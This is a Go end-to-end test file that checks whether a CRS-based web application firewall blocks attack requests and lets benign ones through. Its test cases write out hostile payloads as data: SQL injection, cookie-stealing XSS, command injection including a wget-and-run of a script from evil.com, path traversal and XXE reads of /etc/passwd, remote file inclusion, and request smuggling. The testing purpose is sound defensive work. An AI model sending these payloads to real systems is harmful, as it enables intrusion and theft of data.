package e2e_test

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"
)

// ─── CRS Detection Verification ────────────────────────────────────
//
// Validates that the CRS default rules actually detect and block attacks.
// Sets inbound anomaly threshold to 5 (CRITICAL = 5 points, one match blocks)
// and sends attack payloads for each major CRS category.
//
// Each subtest sends a request with a known attack pattern and expects 403.
// A control request with benign content is also sent to verify no false positives.

func TestCRSDetection(t *testing.T) {
	// ── Setup: lower anomaly threshold so a single CRITICAL detection blocks ──
	origCfg := getWAFConfig(t)
	defer restoreWAFConfig(t, origCfg)

	setWAFConfig(t, map[string]any{
		"defaults": map[string]any{
			"paranoia_level":    2,
			"inbound_threshold": 5,
		},
	})
	deployAndWaitForBlock(t)

	// ── SQLi: SQL Injection (942xxx) ──────────────────────────────────
	t.Run("SQLi-UNION", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?id=1+UNION+SELECT+password+FROM+users--", "", nil)
	})
	t.Run("SQLi-OR-1=1", func(t *testing.T) {
		assertAttackBlocked(t, "POST", "/post", "username=admin'+OR+'1'='1'--&password=x",
			map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	})
	t.Run("SQLi-tautology", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?id=1+OR+1=1", "", nil)
	})
	t.Run("SQLi-comment", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=admin'--", "", nil)
	})
	t.Run("SQLi-SLEEP", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?id=1+AND+SLEEP(5)--", "", nil)
	})
	t.Run("SQLi-stacked", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?id=1;DROP+TABLE+users--", "", nil)
	})

	// ── XSS: Cross-Site Scripting (941xxx) ────────────────────────────
	t.Run("XSS-script-tag", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=<script>alert(document.cookie)</script>", "", nil)
	})
	t.Run("XSS-img-onerror", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=<img+src=x+onerror=alert(1)>", "", nil)
	})
	t.Run("XSS-svg-onload", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=<svg/onload=alert(1)>", "", nil)
	})
	t.Run("XSS-event-handler", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=<body+onload=alert('XSS')>", "", nil)
	})
	t.Run("XSS-javascript-uri", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?url=javascript:alert(1)", "", nil)
	})

	// ── RCE: Remote Command Execution (932xxx) ────────────────────────
	t.Run("RCE-semicolon", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?cmd=;cat+/etc/passwd", "", nil)
	})
	t.Run("RCE-pipe", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?cmd=|id", "", nil)
	})
	t.Run("RCE-backtick", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=`id`", "", nil)
	})
	t.Run("RCE-dollar-paren", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?q=$(whoami)", "", nil)
	})
	t.Run("RCE-wget", func(t *testing.T) {
		assertAttackBlocked(t, "POST", "/post", "input=;wget+http://evil.com/shell.sh|sh",
			map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	})

	// ── LFI: Local File Inclusion (930xxx) ────────────────────────────
	t.Run("LFI-traversal", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?file=../../../etc/passwd", "", nil)
	})
	t.Run("LFI-encoded", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?file=..%2f..%2f..%2fetc%2fpasswd", "", nil)
	})

	// ── RFI: Remote File Inclusion (931xxx) ────────────────────────────
	t.Run("RFI-http", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?page=http://evil.com/shell.php", "", nil)
	})
	t.Run("RFI-data-uri", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCk7Pz4=", "", nil)
	})

	// ── PHP Injection (933xxx) ────────────────────────────────────────
	t.Run("PHP-wrapper", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?file=php://filter/convert.base64-encode/resource=index", "", nil)
	})

	// ── Java Injection (944xxx) ───────────────────────────────────────
	t.Run("Java-deserialization", func(t *testing.T) {
		assertAttackBlocked(t, "POST", "/post", "data=java.lang.Runtime.getRuntime().exec('id')",
			map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	})

	// ── Protocol Enforcement (920xxx) ─────────────────────────────────
	t.Run("Protocol-request-smuggling", func(t *testing.T) {
		// Transfer-Encoding + Content-Length = request smuggling attempt
		assertAttackBlocked(t, "POST", "/post", "x=1",
			map[string]string{
				"Content-Type":      "application/x-www-form-urlencoded",
				"Transfer-Encoding": "chunked",
				"Content-Length":    "3",
			})
	})

	// ── Session Fixation (943xxx) ─────────────────────────────────────
	t.Run("Session-fixation-URL", func(t *testing.T) {
		assertAttackBlocked(t, "GET", "/get?url=http://example.com/page?PHPSESSID=abc123", "", nil)
	})

	// ── Scanner Detection (913xxx) ────────────────────────────────────
	t.Run("Scanner-UA-sqlmap", func(t *testing.T) {
		assertAttackBlockedWithUA(t, "GET", "/get", "", "sqlmap/1.4")
	})
	t.Run("Scanner-UA-nikto", func(t *testing.T) {
		assertAttackBlockedWithUA(t, "GET", "/get", "", "Nikto/2.1.5")
	})

	// ── Custom Rules (91000xx) ────────────────────────────────────────
	t.Run("Custom-XXE", func(t *testing.T) {
		assertAttackBlocked(t, "POST", "/post",
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			map[string]string{"Content-Type": "text/xml"})
	})

	// ── Benign requests must pass ────────────────────────────────────
	t.Run("Benign-GET", func(t *testing.T) {
		assertBenignPasses(t, "GET", "/get", "")
	})
	t.Run("Benign-POST-JSON", func(t *testing.T) {
		assertBenignPasses(t, "POST", "/post", `{"name":"alice","count":42}`)
	})
	t.Run("Benign-POST-form", func(t *testing.T) {
		assertBenignPassesForm(t, "/post", "username=alice&password=hunter2")
	})
	t.Run("Benign-robots.txt", func(t *testing.T) {
		assertBenignPasses(t, "GET", "/robots.txt", "")
	})
	t.Run("Benign-query-params", func(t *testing.T) {
		assertBenignPasses(t, "GET", "/get?page=1&sort=name&order=asc", "")
	})
}

// ── Helpers ──────────────────────────────────────────────────────────

func getWAFConfig(t *testing.T) []byte {
	t.Helper()
	_, body := httpGet(t, wafctlURL+"/api/config")
	return body
}

func restoreWAFConfig(t *testing.T, body []byte) {
	t.Helper()
	req, _ := http.NewRequest("PUT", wafctlURL+"/api/config", strings.NewReader(string(body)))
	req.Header.Set("Content-Type", "application/json")
	setBrowserHeaders(req)
	resp, err := deployClient.Do(req)
	if err != nil {
		t.Logf("warning: failed to restore WAF config: %v", err)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	deployWAF(t)
}

func setWAFConfig(t *testing.T, cfg map[string]any) {
	t.Helper()
	resp, body := httpPut(t, wafctlURL+"/api/config", cfg)
	if resp.StatusCode != 200 {
		t.Fatalf("PUT /api/config: %d — %s", resp.StatusCode, body)
	}
}

func deployAndWaitForBlock(t *testing.T) {
	t.Helper()
	time.Sleep(1 * time.Second) // mtime boundary
	deployWAF(t)
	// Wait for the plugin to hot-reload the new config by sending a known
	// attack pattern and checking it gets blocked.
	waitForCondition(t, "CRS detect rules active", 15*time.Second, func() bool {
		code := sendAttack("GET", "/get?id=1+UNION+SELECT+password+FROM+users--", "", nil)
		return code == 403
	})
}

func sendAttack(method, path, body string, headers map[string]string) int {
	u := caddyURL + path
	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, u, bodyReader)
	if err != nil {
		return 0
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,*/*")
	req.Header.Set("Accept-Language", "en")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	// Default Content-Type for POST with body
	if body != "" && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode
}

func assertAttackBlocked(t *testing.T, method, path, body string, headers map[string]string) {
	t.Helper()
	code := sendAttack(method, path, body, headers)
	if code != 403 {
		t.Errorf("%s %s: expected 403, got %d", method, path, code)
	}
}

func assertAttackBlockedWithUA(t *testing.T, method, path, body, ua string) {
	t.Helper()
	u := caddyURL + path
	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	req, _ := http.NewRequest(method, u, bodyReader)
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,*/*")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 403 {
		t.Errorf("%s %s (UA=%s): expected 403, got %d", method, path, ua, resp.StatusCode)
	}
}

func assertBenignPasses(t *testing.T, method, path, body string) {
	t.Helper()
	u := caddyURL + path
	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	req, _ := http.NewRequest(method, u, bodyReader)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,*/*")
	req.Header.Set("Accept-Language", "en")
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode == 403 {
		t.Errorf("%s %s: benign request blocked (403)", method, path)
	}
}

func assertBenignPassesForm(t *testing.T, path, formBody string) {
	t.Helper()
	u := caddyURL + path
	vals, _ := url.ParseQuery(formBody)
	req, _ := http.NewRequest("POST", u, strings.NewReader(vals.Encode()))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode == 403 {
		t.Errorf("POST %s: benign form request blocked (403)", path)
	}
}

// httpRawRequest sends a request with full control over headers (no browserTransport).
func httpRawRequest(method, rawURL, body string, headers map[string]string) (int, error) {
	var bodyReader io.Reader
	if body != "" {
		bodyReader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, rawURL, bodyReader)
	if err != nil {
		return 0, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	rawClient := &http.Client{Timeout: httpTimeout}
	resp, err := rawClient.Do(req)
	if err != nil {
		return 0, fmt.Errorf("%s %s: %w", method, rawURL, err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode, nil
}
